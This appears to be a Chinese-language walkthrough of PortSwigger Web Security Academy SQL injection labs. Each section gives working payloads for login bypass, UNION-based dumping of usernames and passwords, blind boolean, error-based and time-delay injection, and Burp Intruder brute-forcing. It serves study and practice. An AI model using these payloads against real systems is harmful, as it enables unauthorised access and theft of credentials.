# SQL injection

## 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

> 最基础的SQL注入，由于题目中已经告诉了语句格式，即告诉了`category`字段为单引号闭合，实际测试中可能需要花费一定时间去判断*脆弱字段*和*闭合形式*。

随便选择一个类别，然后修改类别名为不存在的名称，例如`abc`，然后进行单引号闭合，加入OR语句`or 1=1`，最后进行注释`--+`以使SQL语句成立，最后请求URL即为`https://xxxxxxx.web-security-academy.net/filter?category=abc'%20or%201%3D1--+`。

## 2: SQL injection vulnerability allowing login bypass

> 也是基础的SQL注入，题目要求登录`administrator`用户，那么用户名输入`administrator' --+`即可。实际中，可能需要测试一下闭合形式，我最开始是没有单引号的，发现失败了，就结合上一题（信息收集）测试一下单引号即可。

点击`My Account`进入登陆界面，用户名输入`administrator' --+`，密码任意输入（防止有检测空密码的JavaScript代码阻止登录），最后请求包数据为`csrf=xxxxxxx&username=administrator%27%20--%2B&password=administrator`

## 3: SQL injection attack, querying the database type and version on Oracle

> 基本的思路就是`union`一个查询数据库版本的语句，然后让其回显。

由于我对Oracle的语句并不熟悉，所以我参考了[一些资料](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

通过`' and 1=1--+`和`' and 1=2--+`确定是单引号闭合之后，就可以开始判断当前表的列数。

第一步需要判断当前表的列数（因为这关乎我们之后select语句返回数据的数量），可以通过`order by`语句进行测试，会发现`order by 3`时会报错，`order by 2`时正常，那么可以判断当前表有两列，即`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+order+by+2--+`。

接下来就可以开始使用`union`语句确定回显。在MySQL中，我们可以通过`select 1,2`的语句进行测试回显，但在Oracle中，必须要包含`from table`，所以我们使用`select '1','2' from dual`来进行测试（需要使用字符串而非数字，具体原因我不太清楚，之后如果系统了解Oracle应该会涉及）。*dual是Oracle的一个实际存在的表，常用在没有目标表的select语句中*。请求URL为`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+union+select+%271%27,%272%27+from+dual--+`，我们会发现两部分都会回显。

通过资料可以发现，Oracle中查询版本的语句为`SELECT banner FROM v$version`和`SELECT version FROM v$instance
`，我们以前者为例子，直接修改之前的select语句即可，例如`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+union+select+null,banner+from+v$version--+`，这里的`null`可以换成`%271%27`或直接`banner`。

## 4: SQL injection attack, querying the database type and version on MySQL and Microsoft

> 与上一个一样，不过就是后端不一样，换一些语法就可以了。

`https://xxxxxxx.web-security-academy.net/filter?category=Accessories%27+union+select+1,@@version--+`

你也可以使用`version()`来替代`@@version`，这是我在下一个Lab中发现的，`version()`适用于所有非Oracle的数据库，但`@@version`仅适用于MySQL和Microsoft。

## 5: SQL injection attack, listing the database contents on non-Oracle databases

> 可以先通过注入查询数据库得到用户名密码，最后再登录。

可以通过`https://xxxxxxx.web-security-academy.net/filter?category=Gifts%27+union+select+%271%27,version()--+`来进行初步测试，确定后端为`PostgreSQL`。

同样使用[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)中的Payload，我们可以通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,table_name+from+information_schema.tables--+`查看数据库表名，使用`ABC`这个不存在的category是为了去掉原本正常的数据。

搜索关键字`user`，挑选一个可能性较大的表，例如`pg_user`，通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,column_name+from+information_schema.columns+where+table_name=%27pg_user%27--+`查询其列名，会发现有`usename`和`passwd`两列。

最后通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+usename,passwd+from+pg_user--+`，但是发现这里只有两个用户`peter`和`postgres`，所以我们表找错了。最后再查看一次所有表，觉得`users_alyjev`可能也较大，进行查询后得到用户名密码，登录即可。

## 6: SQL injection attack, listing the database contents on Oracle

> 思路与上一个Lab一样，不过后端是Oracle。

通过`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,table_name+from+all_tables--+`查询所有表名，我们先选择`USERS_VSCHVE`这个表进行查询`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,column_name+from+all_tab_columns+where+table_name=%27USERS_VSCHVE%27--+`，然后查询用户名密码`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+USERNAME_LBWZOB,PASSWORD_JXBWPH+from+USERS_VSCHVE--+`，最后登录即可。

## 7: SQL injection UNION attack, determining the number of columns returned by the query

> 关键点在于通过`order by`判断有几列，然后根据题目要求添加一行空数据即可。

`https://xxxxxxx.web-security-academy.net/filter?category=Pets%27%20order%20by%203--+`

`https://xxxxxxx.web-security-academy.net/filter?category=Pets%27union+select+null,null,null--+`

## 8: SQL injection UNION attack, finding a column containing text

> 确定回显点为第二列之后，就可以在回显处完成输出`7ix1eZ`。

`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,%277ix1eZ%27,%273%27--+`

## 9: SQL injection UNION attack, retrieving data from other tables

> 跟第5个lab几乎一致。

## 10: SQL injection UNION attack, retrieving multiple values in a single column

> 这个题与之前获取用户名密码的不一样在于，它只有一个回显点，所以我们不能直接同时获取到所有的用户名与密码。

如果我们只想要获取`administrator`账户的密码，我们只需要利用`where`添加一个条件即可，`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,password+from+users+where+username=%27administrator%27--+`。

但这题的本意是使用拼接，将用户名和密码作为一个column回显，这样我们就可以得到所有的用户名和密码，`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,username||%27|%27||password+from+users--+`，我们可以得到只用`|`拼接用户名和密码的字段。这里需要注意我们不可以使用`&`进行拼接，因为`&`在URL用于连接不同参数。

## 11: Blind SQL injection with conditional responses

> 注入点在Cookie中的`TrackingId`字段，且为盲注。

通过BurpSuite抓包，在`TrackingId`字段后分别添加`' and '1'='1`和`' and '1'='2`，可以确定闭合形式为单引号，同时可以注意到请求成功与否的区别在于是否有`Welcome back!`字符串，这可以作为我们盲注的判断依据。

原本打算使用python写一个脚本（事实上我之前写过，应该也不是很难），但发现事实上发现可以使用BurpSuite来遍历从而实现盲注。使用python脚本有一些其他好处，例如可以二分查找，记录结果，在需要爆破库名时很有效。

通过添加`' and (select '1' from users limit 1)='1`来确定存在`users`表（题目中的信息，实际情况中可能需要进行表名的盲注）。

通过添加`' and (select '1' from users where username='administrator')='1`确定存在`administrator`用户。

通过添加`' and (select '1' from users where username='administrator' and length(password)>1)='1`，确定返回中有`Welcome back!`字符串后，使用intruder对长度进行爆破，得到密码长度为20。

然后对密码进行爆破，通过添加`' and (select substring(password,1,1) from users where username='administrator')='1`，我们可以使用`Cluster bomb`，同时遍历`substring`的index和盲注字符。

在这里，我们可以直接对密码进行爆破，但实际环境中，我们需要一次对数据库名、表数量、表名、列数量、列名进行盲注，同时在最后对密码进行爆破时，也不可以使用类似于`Cluster bomb`的方式，我们可能需要利用二分查找等方式尽可能的减少请求次数，以规避将网站测试垮或自身访问被限制等风险。

## 12: Blind SQL injection with conditional errors

> 报错相关的注入我确实不太了解，跟着官方的solution做一遍学习学习。

1. `TrackingId=xyz'`: 发现返回`500 Internal Server Error`。
2. `TrackingId=xyz''`: 发现返回`200 OK`，网页也正常陈列商品。
3. `TrackingId=xyz'||(select '' from dual)||'` 或 `TrackingId=xyz'||(select '')||'`: 根据是否报错判断数据库类型，此为Oracle。
4. `TrackingId=xyz'||(select '' from not-a-real-table)||'`: 此时可以发现返回报错，这是我们就可以在中间这个语句加入一定条件判断从而进行盲注，常见报错条件例如`to_char(1/0)`。
5. `TrackingId=xyz'||(select '' from users where rownum=1)||'`: 确定存在表`users`，需要注意的是*Oracle中没有`limit`，而使用`rownum`来控制查询区间。
6. `TrackingId=xyz'||(select case when (1=1) then '' else to_char(1/0)  end from dual)||'` 与 `TrackingId=xyz'||(select case when (1=1) then '' else to_char(1/0) end from dual)||'`: 通过是否报错确定盲注语句正确。
7. `'||(select case when (1=1) then '' else to_char(1/0) end from users where username='administrator')||'` 与 `'||(select case when (length(password)>1) then '' else to_char(1/0) end from users where username='administrator')||'`: 确定`administrator`用户并使用intruder盲注密码长度。
8. 进行密码盲注。

## 13: Visible error-based SQL injection

> 报错信息可见时，很多都比较方便。这里利用`cast()`函数直接将数据暴露出来。当然你也可以根据是否报错与上一题一样来解决，但既然有报错信息，那我们就可以利用这个信息显示直接暴露数据。

1. `' and cast((select 1) as int)--` 与 `' and cast((select 1) as int)=1--`: 可以得到`500 Internal Server Error`与报错`ERROR: argument of AND must be type boolean, not type integer`与正常网页，可以确定有报错回显。
2. `' and cast((select username from users) as int)=1--`: 你会得到报错`Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'xMV6MCazpBFu8ng4' and cast((select username from users) as i'. Expected  char`，这意味着后端进行了截取处理，我们需要缩短请求的数据，考虑到我们在试图使其进行报错，我们可以直接在TrackingId上动手脚，例如直接删掉或缩短为几个字符。
3. `' and cast((select username from users limit 1) as int)=1--`: 报错`ERROR: invalid input syntax for type integer: "administrator"`中可以泄漏数据`administrator`，如果第一个数据不是`administrator`的话，可以考虑使用`limit 2,1`和`offset`等语法，不过我尝试后得到`limit #,# syntax is not supported`，使用`offset`显然会超过字符数限制。
4. `' and cast((select password from users limit 1) as int)=1--`: 可以从报错`ERROR: invalid input syntax for type integer: "hvhf525whwj4k8uvhjny"`中提取密码。

## 14: Blind SQL injection with time delays

> 什么信息都没有的时候可以使用延时盲注。

需要注意的就是，一些不同后端sleep函数名不太一样，这里是PostgreSQL，需要使用`pg_sleep`，即在`TrackingId`字段后添加`'||pg_sleep(10)--`。

## 15: Blind SQL injection with time delays and information retrieval

> 对延时函数增加一些条件来进行对数据的猜测。需要注意的是，一般情况下我们选择将正确的情况进行延时，错误的情况不延时，因为大多数情况一定是猜解错误的，即`if true then sleep else nothing end`。

这里同时使用了堆叠注入，即在原本的语句后用`;`隔开再拼接一个语句。

1. 在`TrackingId`后添加`'%3bselect case when (1=1) then pg_sleep(5) else pg_sleep(0) end--`，其中`%3b`即为`;`，修改条件后确定盲注语句没有问题。
2. `'%3bselect case when (select username='administrator') then pg_sleep(5) else pg_sleep(0) end from users--`: 确定存在`administrator`用户。
3. `'%3bselect case when (select username='administrator' and length(password)>1) then pg_sleep(5) else pg_sleep(0) end from users--`: 对密码长度进行爆破。
   + 这里爆破长度时可以将是否延时调换一下，因为对密码长度的猜测是从小到大，前面一定为真，后面一定为假，这样前面等待时间会短一点。
4. 对密码进行爆破。
   + 在BurpSuite中爆破时，intruder monitor默认不会显示响应时间，在菜单栏`Columns`中将其打开。

